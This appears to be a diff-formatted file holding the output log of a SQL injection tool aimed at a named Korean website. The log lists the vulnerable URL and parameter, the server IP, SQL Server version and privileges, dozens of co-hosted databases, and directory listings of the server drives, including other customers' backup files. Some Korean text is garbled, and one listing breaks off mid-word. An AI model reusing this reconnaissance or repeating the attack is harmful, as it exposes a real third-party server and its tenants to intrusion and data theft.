@@ -1,0 +1,428 @@
+■漏洞信息:============================================================
+ ·URL:http://www.ilovesafety.co.kr/board/content.asp?id=5838
+ ·页面标题：雀荤家俺
+ ·参数:id=5838
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:218.38.12.200
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 10:11:04 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 13589
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQCQSCTSQ=CJGHLIMAAHGKJOOHKALCAHKG; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：ilovesafety
+- 用户名：ilovesafety
+- 版本：Microsoft SQL Server  2000 - 8.00.818 (Intel X86) 
+	May 31 2003 16:08:15 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：DB2
+- 服务名：MSSQLSERVER
+- 系统用户名：ilovesafety
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+080i	D:\mssql\MSSQL\Data\080i.mdf	
+39diet	d:\mssql\MSSQL\data\39diet_Data.MDF	
+945-7788	d:\mssql\MSSQL\data\945-7788_Data.MDF	
+包厩历澄	d:\mssql\MSSQL\data\包厩历澄_Data.MDF	
+措傈炼版蛆雀	d:\mssql\MSSQL\Data\措傈炼版蛆雀_Data.mdf	
+aait	d:\mssql\MSSQL\data\aait_Data.MDF	
+aceofkorea	d:\mssql\MSSQL\Data\aceofkorea_Data.mdf	
+actsvision	D:\mssql\MSSQL\Data\actsvision_Data.mdf	
+admindb	d:\mssql\MSSQL\data\admindb.mdf	
+aje-h	D:\mssql\MSSQL\Data\aje-h.mdf	
+allianztraining	d:\mssql\MSSQL\Data\allianztraining_Data.mdf	
+andbanner	d:\mssql\MSSQL\data\andbanner_Data.MDF	
+armygosi	d:\mssql\MSSQL\Data\armygosi_Data.mdf	
+arneg	D:\mssql\MSSQL\Data\arneg_Data.MDF	
+asianfem	d:\mssql\MSSQL\data\asianfem_Data.MDF	
+askmc	d:\mssql\MSSQL\Data\askmc_Data.mdf	
+atinterior	d:\mssql\MSSQL\Data\atinterior_Data.mdf	
+atworth	d:\mssql\MSSQL\Data\atworth_Data.mdf	
+bitsolution	d:\mssql\MSSQL\Data\bitsolution_Data.mdf	
+boilerkorea	d:\mssql\MSSQL\Data\boilerkorea_Data.mdf	
+bomddul	d:\mssql\MSSQL\Data\bomddul_Data.mdf	
+borimpress	D:\mssql\MSSQL\Data\borimpress_Data.mdf	
+brainsharp	d:\mssql\MSSQL\data\brainsharp_Data.MDF	
+bs2	d:\mssql\MSSQL\data\bs2_Data.MDF	
+businesslawcenter	d:\mssql\MSSQL\Data\businesslawcenter_Data.mdf	
+buydum	D:\mssql\MSSQL\Data\buydum.mdf	
+caferoma	d:\mssql\MSSQL\Data\caferoma_Data.mdf	
+candv	d:\mssql\MSSQL\data\candv_Data.MDF	
+cdhani	d:\mssql\MSSQL\Data\cdhani_Data.mdf	
+choice-golf	d:\mssql\MSSQL\data\choice-golf_Data.MDF	
+choiceone	d:\mssql\MSSQL\Data\choiceone_Data.mdf	
+choi-sun	D:\mssql\MSSQL\Data\choi-sun_Data.MDF	
+cni21	d:\mssql\MSSQL\Data\cni21_Data.mdf	
+cnsports	d:\mssql\MSSQL\Data\cnsports_Data.mdf	
+cnukb	D:\mssql\MSSQL\Data\cnukb_Data.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLGate.exe	sleeping	PC-FFF5C4AF14F2	3292	AWAITING COMMAND		
+SQLGate.exe	sleeping	PC-FFF5C4AF14F2	3292	AWAITING COMMAND		
+SQLGate.exe	sleeping	PC-FFF5C4AF14F2	3292	AWAITING COMMAND		
+SQLGate.exe	sleeping	PC-FFF5C4AF14F2	3292	AWAITING COMMAND		
+PHP 5.1.2	sleeping	log.youiwe.co.kr	227446	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+DB2	SQL Server	SQLOLEDB	DB2		DB2	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+
+汗盔累诀侩Data\
+货 弃歹\
+mssql\
+RECYCLER\
+System Volume Information\
+zipcode\
+ALYac_OS_x86_2.1.0.1_ko-kr.exe
+asdf
+D37616xxt
+
+Dir of C:: 
+一次性获取失败，正在批次获取……
+
+20070405\
+瘤况档 凳\
+attach\
+backup\
+c5e0a7b0f1850dde9bc366e6d8ec\
+Documents and Settings\
+Program Files\
+RECYCLER\
+sql2ksp3\
+System Volume Information\
+TempEI4\
+test\
+tong\
+WINDOWS\
+wmpub\
+work\
+20060904_mssql_drik_db.bak
+货 咆胶飘 巩辑.txt
+ahcmd
+arneg_091030.bak
+AUTOEXEC.BAT
+BACK.DB
+bomddul
+bomddul.bak
+cbs_091029.bak
+cmd
+CONFIG.SYS
+D32282pdm
+D37616xxt
+D42751rfu.bak
+D47853q0p
+designcall
+designcall_20070515.dump
+drdrum_20080819.bak
+jinohuserto_20080808.bak
+maxmexy_20080808.bak
+meritv.bak
+meritv_20080902.bak
+mertiv_20080825.bak
+msizap.exe
+navimor_db_200801140303.BAK
+popsjazz
+procexp.exe
+sb119.xls
+system
+tt.txt
+tworld.xls
+tworld2.xls
+wh5522.bak
+yukimunse___dbbackup20070622
+yukimunse_20070621
+zioevent.bak
+zipcode_20080627.xls
+
+Dir of C:\test: 
+
+
+Dir of C:\sql2ksp3: 
+
+books\
+devtools\
+EQHotfix\
+install\
+x86\
+license.txt
+msolap.iss
+redist.txt
+setup.bat
+sms2kdef.bat
+smssql2ksp3.pdf
+sp3readme.htm
+sql2k9x.bat
+sql2k9x.iss
+sql2kcli.bat
+sql2kcli.iss
+sql2kdef.bat
+sql2kdef.iss
+sql2knm.bat
+sql2knm.iss
+sql2ktls.bat
+sql2ktls.iss
+
+Dir of E:: 
+
+
+Dir of D:\zipcode: 
+
+zipcode_20090623(1).xls
+
+Dir of D:\System Volume Information: 
+
+
+Dir of D:\RECYCLER: 
+
+S-1-5-21-4168886337-1689756566-603608777-500\
+
+Dir of D:\汗盔累诀侩Data: 
+
+
+Dir of C:\wmpub: 
+
+wmiislog\
+
+Dir of C:\wmpub\wmiislog: 
+
+
+Dir of C:\WINDOWS: 
+一次性获取失败，正在批次获取……
+
+$hf_mig$\
+$NtServicePackUninstall$\
+$NtUninstallKB2079403$\
+$NtUninstallKB2115168$\
+$NtUninstallKB2121546$\
+$NtUninstallKB2141007$\
+$NtUninstallKB2158563$\
+$NtUninstallKB2160329$\
+$NtUninstallKB2183461$\
+$NtUninstallKB2229593$\
+$NtUninstallKB2259922$\
+$NtUninstallKB2279986$\
+$NtUninstallKB2286198$\
+$NtUninstallKB2296011$\
+$NtUninstallKB2296199$\
+$NtUninstallKB2345886$\
+$NtUninstallKB2347290$\
+$NtUninstallKB2360131$\
+$NtUninstallKB2360937$\
+$NtUninstallKB2378111$\
+$NtUninstallKB2387149$\
+$NtUninstallKB2393802$\
+$NtUninstallKB2416400$\
+$NtUninstallKB2416451$\
+$NtUninstallKB2419635$\
+$NtUninstallKB2423089$\
+$NtUninstallKB2436673$\
+$NtUninstallKB2440591$\
+$NtUninstallKB2443105$\
+$NtUninstallKB2443685$\
+$NtUninstallKB2467659$\
+$NtUninstallKB2476687$\
+$NtUninstallKB2478960$\
+$NtUninstallKB2478971$\
+$NtUninstallKB2479628$\
+$NtUninstallKB2482017$\
+$NtUninstallKB2483185$\
+$NtUninstallKB2485376$\
+$NtUninstallKB890046$\
+$NtUninstallKB893756$\
+$NtUninstallKB896358$\
+$NtUninstallKB896422$\
+$NtUninstallKB896424$\
+$NtUninstallKB896428$\
+$NtUninstallKB896688$\
+$NtUninstallKB898715$\
+$NtUninstallKB899587$\
+$NtUninstallKB899588$\
+$NtUninstallKB899589$\
+$NtUninstallKB899591$\
+$NtUninstallKB900725$\
+$NtUninstallKB901017$\
+$NtUninstallKB901190$\
+$NtUninstallKB901214$\
+$NtUninstallKB902400$\
+$NtUninstallKB904706$\
+$NtUninstallKB905414$\
+$NtUninstallKB905915$\
+$NtUninstallKB908519$\
+$NtUninstallKB908531$\
+$NtUninstallKB910437$\
+$NtUninstallKB911280$\
+$NtUninstallKB911562$\
+$NtUninstallKB911564$\
+$NtUninstallKB911567$\
+$NtUninstallKB911897$\
+$NtUninstallKB911927$\
+$NtUninstallKB912812$\
+$NtUninstallKB912919$\
+$NtUninstallKB913446$\
+$NtUninstallKB914388$\
+$NtUninstallKB914389$\
+$NtUninstallKB916281$\
+$NtUninstallKB917159$\
+$NtUninstallKB917344$\
+$NtUninstallKB917422$\
+$NtUninstallKB917734$\
+$NtUninstallKB917953$\
+$NtUninstallKB918118$\
+$NtUninstallKB918439$\
+$NtUninstallKB918899$\
+$NtUninstallKB920213$\
+$NtUninstallKB920214$\
+$NtUninstallKB920670$\
+$NtUninstallKB920683$\
+$NtUninstallKB920685$\
+$NtUninstallKB921398$\
+$NtUninstallKB921503$\
+$NtUninstallKB921883$\
+$NtUninstallKB922582$\
+$NtUninstallKB922616$\
+$NtUninstallKB922760$\
+$NtUninstallKB922819$\
+$NtUninstallKB923191$\
+$NtUninstallKB923414$\
+$NtUninstallKB923561$\
+$NtUninstallKB923689$\
+$NtUninstallKB923694$\
+$NtUninstallKB923980$\
+$NtUninstallKB924191$\
+$NtUninstallKB924496$\
+$NtUninstallKB924667$\
+$NtUninstallKB925398_WMP64$\
+$NtUninstallKB925454$\
+$NtUninstallKB925486$\
+$NtUninstallKB925902$\
+$NtUninstallKB925902_0$\
+$NtUninstallKB926122$\
+$NtUninstallKB926436$\
+$NtUninstallKB927891$\
+$NtUninstallKB928090$\
+$NtUninstallKB928255$\
+$NtUninstallKB928843$\
+$NtUninstallKB929123$\
+$NtUninstallKB929969$\
+$NtUninstallKB930178$\
+$NtUninstallKB931768$\
+$NtUninstallKB931784$\
+$NtUninstallKB931836$\
+$NtUninstallKB932168$\
+$NtUninstallKB933360$\
+$NtUninstallKB933566$\
+$NtUninstallKB933729$\
+$NtUninstallKB933854$\
+$NtUninstallKB935839$\
+$NtUninstallKB935840$\
+$NtUninstallKB936021$\
+$NtUninstallKB936357$\
+$NtUninstallKB936782$\
+$NtUninstallKB937143$\
+$NtUninstallKB938127$\
+$NtUninstallKB938464$\
+$NtUninstallKB939653$\
+$NtUninstallKB941202$\
+$NtUninstallKB941568$\
+$NtUninstallKB941569$\
+$NtUninstallKB941644$\
+$NtUninstallKB941693$\
+$NtUninstallKB942615$\
+$NtUninstallKB942763$\
+$NtUninstallKB942840$\
+$NtUninstallKB943055$\
+$NtUninstallKB943460$\
+$NtUninstallKB943485$\
+$NtUninstallKB944338$\
+$NtUninstallKB944533$\
+$NtUninstallKB944653$\
+$NtUninstallKB945553$\
+$NtUninstallKB946026$\
+$NtUninstallKB947864$\
+$NtUninstallKB948496$\
+$NtUninstallKB948590$\
+$NtUninstallKB948881$\
+$NtUninstallKB950759$\
+$NtUninstallKB950760$\
+$NtUninstallKB950762$\
+$NtUninstallKB950974$\
+$NtUninstallKB951066$\
+$NtUninstallKB951072-v2$\
+$NtUninstallKB951698$\
+$NtUninstallKB951748$\
+$NtUninstallKB952004$\
+$NtUninstallKB952069$\
+$NtUninstallKB952954$\
+$NtUninstallKB953298$\
+$NtUninstallKB953838$\
+$NtUninstallKB953839$\
+$NtUninstallKB954155$\
+$NtUninstallKB954211$\
+$NtUninstallKB954600$\
+$NtUninstallKB955069$\
+$NtUninstallKB955759$\
+$NtUni
+Dir of C:\tong: 
+
+dreamboardlisti
+loguserto
+webhostingi
+
+Dir of C:\test: 
+
+
+Dir of C:\TempEI4: 
+
+31.tmp
+EI42.LOG
+EI430.LOG
+EI432.LOG
+Unicows.dll
+
+Dir of C:\System Volume Information: 
+
+
